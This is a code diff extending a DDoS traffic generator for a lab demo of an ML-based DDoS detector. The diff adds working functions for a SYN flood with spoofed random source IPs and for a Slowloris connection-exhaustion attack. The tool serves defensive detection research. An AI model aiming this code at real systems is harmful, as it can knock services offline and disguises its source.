@@ -2,28 +2,33 @@
 """
 ddos_traffic_generator.py - Traffic generator for 2-VM DDoS detection demo.
 
-Generates different types of network traffic matching the 6 DDoS attack
-categories in the CICDDoS2019 dataset, plus benign traffic. Designed to
-run on the ATTACKER VM targeting the VICTIM VM where live_ips.py is
-running.
+Generates different types of network traffic for testing the ML-based
+DDoS detection system. Covers the 6 attack categories in the CICDDoS2019
+dataset plus benign traffic, and additional scenarios (SYN Flood with
+IP spoofing, Slowloris). Designed to run on the ATTACKER VM targeting
+the VICTIM VM where live_ips.py is running.
 
 This script is intended for CONTROLLED LAB ENVIRONMENTS ONLY.
 Only use it between VMs on an isolated virtual network.
 
 Usage:
     sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_flood
+    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_spoof -d 30
+    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack slowloris -d 60
     sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all --duration 30
     sudo python3 tools/ddos_traffic_generator.py --list
 
-Attack types:
-    benign       - Normal HTTP/ICMP traffic
-    syn_flood    - TCP SYN Flood
-    udp_flood    - UDP Flood
-    udp_lag      - UDP-Lag Flood (large payloads)
-    ldap_flood   - LDAP amplification-style traffic
-    mssql_flood  - MSSQL amplification-style traffic
-    netbios_flood- NetBIOS amplification-style traffic
-    all          - Run all attacks sequentially
+Attack types (Kịch bản):
+    benign        - Normal HTTP/ICMP traffic
+    syn_flood     - TCP SYN Flood (Layer 4)
+    syn_spoof     - TCP SYN Flood with IP Spoofing (--rand-source style)
+    udp_flood     - UDP Flood
+    udp_lag       - UDP-Lag Flood (large payloads)
+    ldap_flood    - LDAP amplification-style traffic
+    mssql_flood   - MSSQL amplification-style traffic
+    netbios_flood - NetBIOS amplification-style traffic
+    slowloris     - Slowloris (Layer 7) — hold HTTP connections open
+    all           - Run all attacks sequentially
 
 Requirements:
     pip install scapy
@@ -36,6 +41,7 @@ import argparse
 import logging
 import os
 import random
+import socket
 import sys
 import time
 
@@ -62,12 +68,14 @@ except ImportError:
 
 ATTACK_DESCRIPTIONS = {
     "benign": "Normal HTTP GET/ICMP ping traffic",
-    "syn_flood": "TCP SYN Flood — mass SYN packets to exhaust connection table",
+    "syn_flood": "TCP SYN Flood (Layer 4) — mass SYN packets from real IP",
+    "syn_spoof": "TCP SYN Flood + IP Spoofing (Layer 4) — random source IPs (like hping3 --rand-source)",
     "udp_flood": "UDP Flood — high-rate small UDP packets to saturate bandwidth",
     "udp_lag": "UDP-Lag Flood — large UDP payloads causing processing delay",
     "ldap_flood": "LDAP amplification-style — UDP port 389 with LDAP-like payloads",
     "mssql_flood": "MSSQL amplification-style — UDP port 1434 with MSSQL-like payloads",
     "netbios_flood": "NetBIOS amplification-style — UDP port 137 with NetBIOS-like payloads",
+    "slowloris": "Slowloris (Layer 7) — hold HTTP connections open to exhaust server threads",
 }
 
 
@@ -113,7 +121,7 @@ def generate_benign(target: str, duration: float, pps: int) -> None:
 
 
 def generate_syn_flood(target: str, duration: float, pps: int) -> None:
-    """TCP SYN Flood — send SYN packets with random source ports."""
+    """TCP SYN Flood (Layer 4) — send SYN packets with random source ports."""
     logger.info(f"SYN Flood to {target}:{80} for {duration}s at ~{pps} pps")
     end_time = time.time() + duration
     count = 0
@@ -131,6 +139,45 @@ def generate_syn_flood(target: str, duration: float, pps: int) -> None:
         time.sleep(delay)
 
     logger.info(f"SYN Flood done: {count} packets sent")
+
+
+def _random_ip() -> str:
+    """Generate a random non-reserved IP address for spoofing."""
+    while True:
+        octets = [random.randint(1, 254) for _ in range(4)]
+        if octets[0] in (10, 127) or (octets[0] == 172 and 16 <= octets[1] <= 31):
+            continue
+        if octets[0] == 192 and octets[1] == 168:
+            continue
+        return ".".join(str(o) for o in octets)
+
+
+def generate_syn_spoof(target: str, duration: float, pps: int) -> None:
+    """TCP SYN Flood with IP Spoofing — random source IPs each packet.
+
+    Equivalent to: hping3 -S --flood -V -p 80 --rand-source <target>
+    Each packet has a different spoofed source IP, causing the victim's
+    state table to fill with half-open connections to non-existent hosts.
+    """
+    logger.info(
+        f"SYN Flood + IP Spoofing to {target}:80 for {duration}s at ~{pps} pps"
+    )
+    end_time = time.time() + duration
+    count = 0
+    delay = 1.0 / max(pps, 1)
+
+    while time.time() < end_time:
+        pkt = IP(src=_random_ip(), dst=target) / TCP(
+            sport=RandShort(),
+            dport=80,
+            flags="S",
+            seq=random.randint(0, 2**32 - 1),
+        )
+        send(pkt, verbose=False)
+        count += 1
+        time.sleep(delay)
+
+    logger.info(f"SYN Flood + IP Spoofing done: {count} packets sent")
 
 
 def generate_udp_flood(target: str, duration: float, pps: int) -> None:
@@ -256,21 +303,104 @@ def generate_netbios_flood(target: str, duration: float, pps: int) -> None:
     logger.info(f"NetBIOS Flood done: {count} packets sent")
 
 
+def generate_slowloris(target: str, duration: float, pps: int) -> None:
+    """Slowloris (Layer 7) — hold HTTP connections open.
+
+    Opens many TCP connections to the target web server and sends
+    partial HTTP headers periodically to keep them alive, exhausting
+    the server's connection pool.
+
+    Note: The ML model was trained on CICDDoS2019 which does NOT
+    contain a Slowloris class. The model may classify this traffic
+    as TCP SYN Flood or Benign — this is a known limitation worth
+    discussing in the thesis report.
+    """
+    num_sockets = min(pps, 500)
+    logger.info(
+        f"Slowloris to {target}:80 for {duration}s with {num_sockets} connections"
+    )
+    logger.info(
+        "Note: Model has no Slowloris class — may classify as TCP SYN or Benign"
+    )
+
+    sockets: list[socket.socket] = []
+
+    def _create_socket() -> socket.socket | None:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect((target, 80))
+            s.send(b"GET /?" + os.urandom(4).hex().encode() + b" HTTP/1.1\r\n")
+            s.send(f"Host: {target}\r\n".encode())
+            s.send(b"User-Agent: Mozilla/5.0\r\n")
+            s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
+            return s
+        except Exception:
+            return None
+
+    # Open initial connections
+    for _ in range(num_sockets):
+        s = _create_socket()
+        if s:
+            sockets.append(s)
+
+    logger.info(f"Opened {len(sockets)} initial connections")
+
+    end_time = time.time() + duration
+    keep_alive_count = 0
+
+    while time.time() < end_time:
+        # Send keep-alive headers on existing connections
+        alive = []
+        for s in sockets:
+            try:
+                header = f"X-a: {random.randint(1, 5000)}\r\n"
+                s.send(header.encode())
+                alive.append(s)
+                keep_alive_count += 1
+            except Exception:
+                pass
+        sockets = alive
+
+        # Replenish dropped connections
+        diff = num_sockets - len(sockets)
+        for _ in range(diff):
+            s = _create_socket()
+            if s:
+                sockets.append(s)
+
+        time.sleep(10)  # Send keep-alive every 10s
+
+    # Cleanup
+    for s in sockets:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+    logger.info(
+        f"Slowloris done: {keep_alive_count} keep-alive headers sent, "
+        f"peak {num_sockets} connections"
+    )
+
+
 ATTACK_GENERATORS = {
     "benign": generate_benign,
     "syn_flood": generate_syn_flood,
+    "syn_spoof": generate_syn_spoof,
     "udp_flood": generate_udp_flood,
     "udp_lag": generate_udp_lag,
     "ldap_flood": generate_ldap_flood,
     "mssql_flood": generate_mssql_flood,
     "netbios_flood": generate_netbios_flood,
+    "slowloris": generate_slowloris,
 }
 
 
 def run_all_attacks(target: str, duration: float, pps: int) -> None:
     """Run all attack types sequentially with benign traffic between them."""
-    attacks = ["benign", "syn_flood", "udp_flood", "udp_lag",
-               "ldap_flood", "mssql_flood", "netbios_flood"]
+    attacks = ["benign", "syn_flood", "syn_spoof", "udp_flood", "udp_lag",
+               "ldap_flood", "mssql_flood", "netbios_flood", "slowloris"]
 
     per_attack_duration = duration / len(attacks)
     logger.info(
